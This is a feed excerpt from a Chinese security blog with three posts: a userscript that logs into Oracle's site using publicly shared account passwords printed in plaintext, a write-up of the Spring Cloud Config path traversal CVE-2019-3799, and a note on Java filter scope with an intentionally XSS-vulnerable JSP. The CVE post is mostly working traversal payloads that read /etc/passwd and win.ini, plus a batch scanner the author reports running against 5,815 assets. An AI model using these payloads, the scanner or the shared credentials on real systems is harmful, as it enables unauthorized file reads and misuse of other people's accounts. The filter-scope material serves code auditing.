    <published>2019-05-05T04:33:06.000Z</published>
    <updated>2019-05-10T05:18:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>研究Java漏洞的爱好者，不免要经常去Oracle官网下载各种版本的Java JDK，Weblogic等。我们都知道，Oracle相关产品是需要登录才能下载的。这就意味着你要注册个账号，并且每次下载都要登录，这很繁琐！空闲时简单写了个自动化油猴脚本，无需人工注册和登录即可下载。</p><h2 id="0x01-收集公开账号密码"><a href="#0x01-收集公开账号密码" class="headerlink" title="0x01 收集公开账号密码"></a>0x01 收集公开账号密码</h2><p>网上有很多大佬使用自己邮箱注册了Oracle的账号，并公开了密码，方便大家下载使用，在此感谢他们无私奉献。以下是我收集到的（可成功登录）：</p><blockquote><p><a href="mailto:1772885836@qq.com" target="_blank" rel="noopener">1772885836@qq.com</a><br>OracleTest1234</p><p><a href="mailto:541509124@qq.com" target="_blank" rel="noopener">541509124@qq.com</a><br>LR4ever.1314</p><p><a href="mailto:2696671285@qq.com" target="_blank" rel="noopener">2696671285@qq.com</a><br>Oracle123</p></blockquote><h2 id="0x02-编写油猴脚本"><a href="#0x02-编写油猴脚本" class="headerlink" title="0x02 编写油猴脚本"></a>0x02 编写油猴脚本</h2><p>油猴脚本的功能是在<code>https://login.oracle.com/mysso/signon.jsp</code>页面，自动完成以下操作。将我们上面收集到的账号密码，填写到Oracle单点登录页面的表单中，最后点击登录，完成下载。具体实现我在源码中已经注释得很清楚了。</p><p>我设置了一个变量<code>is_auto_login</code>，默认值为<code>true</code>，就是默认会自动输入账号密码并点击登录。如果你想让脚本只自动填写账号密码不自动点登录，请将其设置<code>false</code>！</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         Oracle download auto login</span></span><br><span class="line"><span class="comment">// @namespace    http://gv7.me</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  自动登录Oracle官网，方便下载Oracle的各种产品，比如:Java JDK,Weblogic等</span></span><br><span class="line"><span class="comment">// @author       c0ny1</span></span><br><span class="line"><span class="comment">// @match        https://login.oracle.com/mysso/signon.jsp</span></span><br><span class="line"><span class="comment">// @grant        none</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">    'use strict'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//是否自动点击登录</span></span><br><span class="line">    <span class="keyword">var</span> is_auto_login = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">//获取随机数</span></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params">lower, upper</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * (upper - lower)) + lower;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过标签名，属性名和属性值来定位元素</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getTargetByTAV</span>(<span class="params">t_tag,t_attr,t_value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> target = <span class="built_in">document</span>.getElementsByTagName(t_tag);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i &lt;target.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(target[i].getAttribute(t_attr) == t_value)&#123;</span><br><span class="line">                <span class="keyword">return</span> target[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//存储账号密码</span></span><br><span class="line">    <span class="keyword">var</span> users = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">var</span> passs = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">3</span>);</span><br><span class="line">    users[<span class="number">0</span>] = <span class="string">"1772885836@qq.com"</span>;</span><br><span class="line">    passs[<span class="number">0</span>] = <span class="string">"OracleTest1234"</span>;</span><br><span class="line">    users[<span class="number">1</span>] = <span class="string">"541509124@qq.com"</span>;</span><br><span class="line">    passs[<span class="number">1</span>] = <span class="string">"LR4ever.1314"</span>;</span><br><span class="line">    users[<span class="number">2</span>] = <span class="string">"2696671285@qq.com"</span>;</span><br><span class="line">    passs[<span class="number">2</span>] = <span class="string">"Oracle123"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//随机获取一个账号密码，并将其填入登录表单中</span></span><br><span class="line">    <span class="keyword">var</span> sso_username = <span class="built_in">document</span>.getElementById(<span class="string">"sso_username"</span>);</span><br><span class="line">    <span class="keyword">var</span> sso_password = <span class="built_in">document</span>.getElementById(<span class="string">"ssopassword"</span>);</span><br><span class="line">    <span class="keyword">var</span> i = random(<span class="number">0</span>,users.length - <span class="number">1</span>);</span><br><span class="line">    sso_username.value = users[i];</span><br><span class="line">    sso_password.value = passs[i];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//是否自动点击登录</span></span><br><span class="line">    <span class="keyword">if</span>(is_auto_login)&#123;</span><br><span class="line">        <span class="keyword">var</span> btn_login = getTargetByTAV(<span class="string">"input"</span>,<span class="string">"tabindex"</span>,<span class="number">3</span>);</span><br><span class="line">        btn_login.click();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h2 id="0x03-脚本效果演示"><a href="#0x03-脚本效果演示" class="headerlink" title="0x03 脚本效果演示"></a>0x03 脚本效果演示</h2><p><img src="/articles/2019/oracle-download-auto-login-tampermonkey-script/oracle-download-auto-login.gif" alt="效果演示"></p><p>脚本已经上传Greasy Fork，需要的自行安装。</p><p><a href="https://greasyfork.org/zh-CN/scripts/382627-oracle-download-auto-login" target="_blank" rel="noopener">https://greasyfork.org/zh-CN/scripts/382627-oracle-download-auto-login</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;研究Java漏洞的爱好者，不免要经常去Oracle官网下载各种版本的Java JDK，Weblogic等。我们都知道，Oracle相关产品是需要登录才能下载的。这就意味着你要注册个账号，并且每次下载都要登录，这很繁琐！空闲时简单写了个自动化油猴脚本，无需人工注册和登录即可下
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>编写Spring Cloud Config Server路径穿越漏洞全面检测脚本</title>
    <link href="http://gv7.me/articles/2019/write-cve-2019-3799-batch-scan-script/"/>
    <id>http://gv7.me/articles/2019/write-cve-2019-3799-batch-scan-script/</id>
    <published>2019-04-20T11:12:55.000Z</published>
    <updated>2019-04-21T06:27:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>Spring Cloud Config Server路径穿越漏洞（CVE-2019-3799）的分析文章已经很多了，这里我不在画蛇填足。在分析该漏洞之后，发现了一些小细节，感觉对该漏洞检测还是挺有帮助的。基于发现的这些细节，我们来构造适应各种场景，甚至各种奇葩场景的批量检测脚本！</p><a id="more"></a><h2 id="0x01-简洁原理"><a href="#0x01-简洁原理" class="headerlink" title="0x01 简洁原理"></a>0x01 简洁原理</h2><p>Spring cloud config 分客户端和服务端。服务端供客户端查询配置，本次漏洞就是出在服务端。</p><p>当客户端提交的访问配置请求，会在服务端被解析为以下2种：</p><ul><li><a href="http://xxx:8888/{name}/{profile}/{label}/{path}" target="_blank" rel="noopener">http://xxx:8888/{name}/{profile}/{label}/{path}</a></li><li><a href="http://xxx:8888/{name}/{profile}/{path}" target="_blank" rel="noopener">http://xxx:8888/{name}/{profile}/{path}</a></li></ul><p>配置文件保存在服务端系统临时文件<code>{system_tmp_path}</code>下。在需要获取目标配置文件绝对路径时，服务端会将客户端提供的相对路径<code>{path}</code>和系统临时文件目录<code>{system_tmp_path}</code>进行拼接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config_file_path = &#123;system_tmp_path&#125; + &#123;path&#125;</span><br></pre></td></tr></table></figure><p>由于<code>{path}</code>客户端可控且未过滤<code>../</code>，从而导致目录穿越，可读服务端机器上任意文件！</p><h2 id="0x02-漏洞检测点"><a href="#0x02-漏洞检测点" class="headerlink" title="0x02 漏洞检测点"></a>0x02 漏洞检测点</h2><p>经过分析代码，可以发现，其实该漏洞有三个检查点。不过网上大多数文章提供的漏洞url只是第一处。</p><p><img src="/articles/2019/write-cve-2019-3799-batch-scan-script/ResourceController_retrieve.png" alt="第一第二处"></p><p><img src="/articles/2019/write-cve-2019-3799-batch-scan-script/EnvironmentController_binary.png" alt="第三处"></p><p>我们先看看第一处<code>@RequestMapping</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;/&#123;name&#125;/&#123;profile&#125;/&#123;label&#125;/**&quot;)</span><br></pre></td></tr></table></figure><p>这里<code>name</code>为应仓库名称,<code>profile</code>为应配置文件环境<code>label</code>为git分支名。实际测试中需要<code>label</code>为存在的分支名（一般git仓库都存在<code>master</code>分支），否则报错，<code>name</code>和<code>profile</code>可以为任意。由此我们可以构造如下url，即可匹配到该<code>@RequestMapping</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx:8888/aaa/bbb/master/&#123;payload&#125;</span><br></pre></td></tr></table></figure><p>我们接着来看第二处<code>@RequestMapping</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/&#123;name&#125;/&#123;profile&#125;/**&quot;, params = &quot;useDefaultLabel&quot;)</span><br></pre></td></tr></table></figure><p>根据Spring的RequestMapping匹配规则我们很容易构造以下url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com:8888/aaa/bbb/&#123;payload&#125;?useDefaultLabel=1</span><br></pre></td></tr></table></figure><p>实际上我们构造的url虽然会被该<code>@RequestMapping</code>匹配到，但并不会执行该注解处代码。而是执行了以下注解处代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org/springframework/cloud/config/server/environment/EnvironmentController.java</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/&#123;name&#125;/&#123;profiles&#125;/&#123;label:.*&#125;"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> Environment <span class="title">labelled</span><span class="params">(...)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是因为我们构造的url，都符合两处注解的匹配规则，但后者匹配度更好优先级更高（<code>*</code>优先级大于<code>**</code>），自然优先被框架用于处理请求了。</p><p>因此我们可以构造以下链接，让第一个注解匹配度最高，使得程序使用存在漏洞的方法来处理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com:8888/aaa/bbb/ccc/&#123;payload&#125;?useDefaultLabel=1</span><br></pre></td></tr></table></figure><p>第三处，和第一处构造的url一样的，需要在数据包Accept头加入<code>application/octet-stream</code>即可触发！</p><p><img src="/articles/2019/write-cve-2019-3799-batch-scan-script/poc_3.png" alt></p><h2 id="0x03-目标操作系统"><a href="#0x03-目标操作系统" class="headerlink" title="0x03 目标操作系统"></a>0x03 目标操作系统</h2><p>在黑盒渗透测试时，无法确定目标系统是Windows还是Linux，故最稳妥的方法是构造适合两者的payload，都检测一篇。</p><ul><li>Linux下读<code>/etc/passwd</code>，检查关键字为<code>root:</code></li><li>Window下读<code>c:/Windows/win.ini</code>,检查关键字为<code>[extensions]</code></li></ul><p>注意： <strong>在Windows下该漏洞无法跨盘符读文件，也就是只能读和系统临时文件夹同盘符的任意路径下任意文件。</strong> 所以在Windwos系统下，系统临时文件路径被修改（这种情况比较少），即使目标存在漏洞，我们的payload也无法检测的，目前暂时没有好的解决方案。</p><h2 id="0x04-25F的个数"><a href="#0x04-25F的个数" class="headerlink" title="0x04 ..%25F的个数"></a>0x04 ..%25F的个数</h2><p><code>..%252F</code>是<code>../</code>的两次URL编码后结果，它是路径穿越的关键，其个数取决于系统临时文件目录的深度。</p><h4 id="3-1-默认情况"><a href="#3-1-默认情况" class="headerlink" title="3.1 默认情况"></a>3.1 默认情况</h4><p>这里的默认情况是指，服务端系统临时目录采用的是默认路径。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Windows系统临时文件存储路径：</span><br><span class="line">file:/C:/Users/ADMINI~1/AppData/Local/Temp/</span><br><span class="line">Windows下Spring cloud config server存储配置路径：</span><br><span class="line">file:/C:/Users/ADMINI~1/AppData/Local/Temp/config-repo-&lt;randomid&gt;/</span><br><span class="line">Linux系统临时文件存储路径：</span><br><span class="line">/tmp/</span><br><span class="line">Linux下Spring cloud config server存储配置路径：</span><br><span class="line">/tmp/config-repo-&lt;randomid&gt;/</span><br></pre></td></tr></table></figure><p>所以要吃掉所有配置路径，Windwos下第一处漏洞检测需要6个<code>..%252F</code>,第二处需要7个，第三处需要6个。Linux下第一处2个，第二处需要3个，第三处需要6个。</p><h4 id="3-2-极端情况"><a href="#3-2-极端情况" class="headerlink" title="3.2 极端情况"></a>3.2 极端情况</h4><p>这里的极端情况是指，服务端系统临时目录被管理员自定义为其他路径，路径深度未知。这时我们可以估计一个最大深度50（相信不会有管理员奇葩到设置更深的目录了）</p><p>综合以上各个方面的分析，我们就可以构造出如下8个POC来检查，以应对各种情况该漏洞的检测。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://xxx:8888/a/b/master/ + &#123;..%252F&#125;*2 + etc%252Fpasswd</span><br><span class="line">http://xxx:8888/a/b/master/ + &#123;..%252F&#125;*6 + Windows%252Fwin.ini</span><br><span class="line">http://xxx:8888/a/b/master/ + &#123;..%252F&#125;*50 + etc%252Fpasswd</span><br><span class="line">http://xxx:8888/a/b/master/ + &#123;..%252F&#125;*50 + Windows%252Fwin.ini</span><br><span class="line">http://xxx:8888/a/b/c/ + &#123;..%252F&#125;*3 + etc%252Fpasswd?useDefaultLabel=a</span><br><span class="line">http://xxx:8888/a/b/c/ + &#123;..%252F&#125;*7 + Windows%252Fwin.ini?useDefaultLabel=a</span><br><span class="line">http://xxx:8888/a/b/c/ + &#123;..%252F&#125;*50 + etc%252Fpasswd?useDefaultLabel=a</span><br><span class="line">http://xxx:8888/a/b/c/ + &#123;..%252F&#125;*50 + Windows%252Fwin.ini?useDefaultLabel=a</span><br></pre></td></tr></table></figure><h2 id="0x05-批量检测脚本"><a href="#0x05-批量检测脚本" class="headerlink" title="0x05 批量检测脚本"></a>0x05 批量检测脚本</h2><p>下面附上我写的POC-T插件，这里说明下本脚本仅供自查和学习使用，请勿用于非法用途，否则后果自负。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Autor: c0ny1</span></span><br><span class="line"><span class="string">Date: 2019-04-20 16:41</span></span><br><span class="line"><span class="string">Description: Directory Traversal with spring-cloud-config-server(CVE-2019-3799)</span></span><br><span class="line"><span class="string">Affected Pivotal Products and Versions:</span></span><br><span class="line"><span class="string">Spring Cloud Config 2.1.0 to 2.1.1</span></span><br><span class="line"><span class="string">Spring Cloud Config 2.0.0 to 2.0.3</span></span><br><span class="line"><span class="string">Spring Cloud Config 1.4.0 to 1.4.5</span></span><br><span class="line"><span class="string">Older unsupported versions are also affected</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> ConnectionError</span><br><span class="line"></span><br><span class="line">WIN_CHECK_KEYWORD = <span class="string">'[extensions]'</span></span><br><span class="line">LINUX_CHECK_KEYWORD = <span class="string">'root:'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_poc</span><span class="params">()</span>:</span></span><br><span class="line">pocs = []</span><br><span class="line">payload = <span class="string">'/a/b/master/'</span> + <span class="string">'..%252F'</span>*<span class="number">2</span> + <span class="string">'etc%252Fpasswd'</span></span><br><span class="line">poc = &#123;<span class="string">'payload'</span>:payload,<span class="string">'keyword'</span>:LINUX_CHECK_KEYWORD&#125;</span><br><span class="line">pocs.append(poc)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a/b/master/'</span> + <span class="string">'..%252F'</span>*<span class="number">6</span> + <span class="string">'Windows%252Fwin.ini'</span></span><br><span class="line">poc = &#123;<span class="string">'payload'</span>:payload,<span class="string">'keyword'</span>:WIN_CHECK_KEYWORD&#125;</span><br><span class="line">pocs.append(poc)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a/b/master/'</span> + <span class="string">'..%252F'</span>*<span class="number">50</span> + <span class="string">'etc%252Fpasswd'</span></span><br><span class="line">poc = &#123;<span class="string">'payload'</span>:payload,<span class="string">'keyword'</span>:LINUX_CHECK_KEYWORD&#125;</span><br><span class="line">pocs.append(poc)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a/b/master/'</span> + <span class="string">'..%252F'</span>*<span class="number">50</span> + <span class="string">'Windows%252Fwin.ini'</span></span><br><span class="line">poc = &#123;<span class="string">'payload'</span>:payload,<span class="string">'keyword'</span>:WIN_CHECK_KEYWORD&#125;</span><br><span class="line">pocs.append(poc)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a/b/c/'</span> + <span class="string">'..%252F'</span>*<span class="number">3</span> + <span class="string">'etc%252Fpasswd?useDefaultLabel=a'</span></span><br><span class="line">poc = &#123;<span class="string">'payload'</span>:payload,<span class="string">'keyword'</span>:LINUX_CHECK_KEYWORD&#125;</span><br><span class="line">pocs.append(poc)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a/b/c/'</span> + <span class="string">'..%252F'</span>*<span class="number">7</span> + <span class="string">'Windows%252Fwin.ini?useDefaultLabel=a'</span></span><br><span class="line">poc = &#123;<span class="string">'payload'</span>:payload,<span class="string">'keyword'</span>:WIN_CHECK_KEYWORD&#125;</span><br><span class="line">pocs.append(poc)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a/b/c/'</span> + <span class="string">'..%252F'</span>*<span class="number">50</span> + <span class="string">'etc%252Fpasswd?useDefaultLabel=a'</span></span><br><span class="line">poc = &#123;<span class="string">'payload'</span>:payload,<span class="string">'keyword'</span>:LINUX_CHECK_KEYWORD&#125;</span><br><span class="line">pocs.append(poc)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a/b/c/'</span> + <span class="string">'..%252F'</span>*<span class="number">50</span> + <span class="string">'Windows%252Fwin.ini?useDefaultLabel=a'</span></span><br><span class="line">poc = &#123;<span class="string">'payload'</span>:payload,<span class="string">'keyword'</span>:WIN_CHECK_KEYWORD&#125;</span><br><span class="line">pocs.append(poc)</span><br><span class="line"><span class="keyword">return</span> pocs</span><br><span class="line"></span><br><span class="line">pocs = init_poc()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> pocs:</span><br><span class="line">        url = url <span class="keyword">if</span> <span class="keyword">not</span> url.endswith(<span class="string">'/'</span>) <span class="keyword">else</span> url[<span class="number">0</span>:len(url)<span class="number">-1</span>] <span class="comment">#去掉结尾/</span></span><br><span class="line">        target_url = url + p.get(<span class="string">'payload'</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(target_url,timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception,e:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (r.status_code == <span class="number">200</span>) <span class="keyword">and</span> (p.get(<span class="string">'keyword'</span>) <span class="keyword">in</span> r.content):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>去参加Avicii的纪念活动之前就挂着扫描，回来发现成果还不错。扫描5815个资产，存在漏洞的有492。最后希望管理员们及时修复吧！</p><p><img src="/articles/2019/write-cve-2019-3799-batch-scan-script/batch_scan_result.png" alt="扫描成果"></p><h2 id="0x06-参考文章"><a href="#0x06-参考文章" class="headerlink" title="0x06 参考文章"></a>0x06 参考文章</h2><ul><li><a href="https://github.com/mpgn/CVE-2019-3799" target="_blank" rel="noopener">https://github.com/mpgn/CVE-2019-3799</a></li><li><a href="https://pivotal.io/security/cve-2019-3799" target="_blank" rel="noopener">https://pivotal.io/security/cve-2019-3799</a></li><li><a href="https://mp.weixin.qq.com/s/roXk5ykq3Jqd4izEOrQ5qw" target="_blank" rel="noopener">Spring Cloud Config Server 路径穿越与任意文件读取漏洞分析 - 【CVE-2019-3799】</a></li><li><a href="https://mp.weixin.qq.com/s/yj0cWEsyiPJr4A7YXpmLJw" target="_blank" rel="noopener">Spring Cloud Config Server 任意文件读取漏洞</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Spring Cloud Config Server路径穿越漏洞（CVE-2019-3799）的分析文章已经很多了，这里我不在画蛇填足。在分析该漏洞之后，发现了一些小细节，感觉对该漏洞检测还是挺有帮助的。基于发现的这些细节，我们来构造适应各种场景，甚至各种奇葩场景的批量检测脚本！&lt;/p&gt;
    
    </summary>
    
      <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>过滤器作用范围/和/*引发的安全问题</title>
    <link href="http://gv7.me/articles/2019/security-raised-by-java-filter-scope-missetting/"/>
    <id>http://gv7.me/articles/2019/security-raised-by-java-filter-scope-missetting/</id>
    <published>2019-04-04T19:10:20.000Z</published>
    <updated>2019-04-04T20:41:08.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>问题：过滤器作用范围设置为/或/*一样么？</strong></p><p>安全人员可能觉得不一样，毕竟从对通配符的认识来说，<code>/</code>代表的只是根目录，<code>/*</code>代表所有。</p><p>开发人员可能觉得一样，根据平常的开发经验，并未发现两者的差别。</p><p>其实呢，这两种认识都不正确，更确切地说前者说的不够正确。具体许我慢慢道来。</p><h2 id="0x01-问题背景"><a href="#0x01-问题背景" class="headerlink" title="0x01 问题背景"></a>0x01 问题背景</h2><p>回想起之前做的代码审计时，发现项目设置全局过滤器时，有的设置为<code>/</code>，有的设置为<code>/*</code>。<br>在自己模糊印象里，在校学jsp时确实感觉两者是一样的。但作为安全人员，还是不禁好奇，于是查资料写代码实验，终于发现他们的不同。在我明白了它们的不同之后，我调查了下周边做安全和开发的朋友，结果清一色的认为它们一样。</p><h2 id="0x02-实验测试"><a href="#0x02-实验测试" class="headerlink" title="0x02 实验测试"></a>0x02 实验测试</h2><p>我们以防御XSS漏洞的demo来实验，过滤器使用上篇文章的代码。</p><p><strong>存在XSS漏洞的jsp页面代码</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% out.write(request.getParameter(<span class="string">"str"</span>));%&gt;</span><br></pre></td></tr></table></figure><p><strong>web.xml中过滤器配置</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CrossSiteScriptFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>me.gv7.filter.XssFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CrossSiteScriptFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;url-pattern&gt;/*&lt;/url-pattern&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dispatcher</span>&gt;</span>REQUEST<span class="tag">&lt;/<span class="name">dispatcher</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="/articles/2019/security-raised-by-java-filter-scope-missetting/show.gif" alt="演示"></p><p>通过演示的结果我们知道：</p><ol><li><code>/*</code>才是真正意义上的过滤所有请求</li><li><code>/</code>并非真正意义上的过滤所有请求，它过滤除jsp页面之外的请求</li></ol><h2 id="0x03-最后总结"><a href="#0x03-最后总结" class="headerlink" title="0x03 最后总结"></a>0x03 最后总结</h2><p>一般项目采用MVC架构之后，基本不会有程序猿继续在jsp文件写后端处理代码。然而这个世界很奇怪，正如墨菲定律说的那样，觉得不可能的往往会发生。而我们更不能把安全寄托于人性上，所以全局安全过滤器请设置作用范围为<code>/*</code>。</p><p>当我们在进行代码审计发现全局过滤器的作用范围为<code>/</code>,则可以着重检查jsp文件中是否包含后端处理代码，毕竟其不在过滤器保护范围内。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;问题：过滤器作用范围设置为/或/*一样么？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;安全人员可能觉得不一样，毕竟从对通配符的认识来说，&lt;code&gt;/&lt;/code&gt;代表的只是根目录，&lt;code&gt;/*&lt;/code&gt;代表所有。&lt;/p&gt;
&lt;p&gt;开发人员可能觉得一样，根据平常
      
    
    </summary>
    
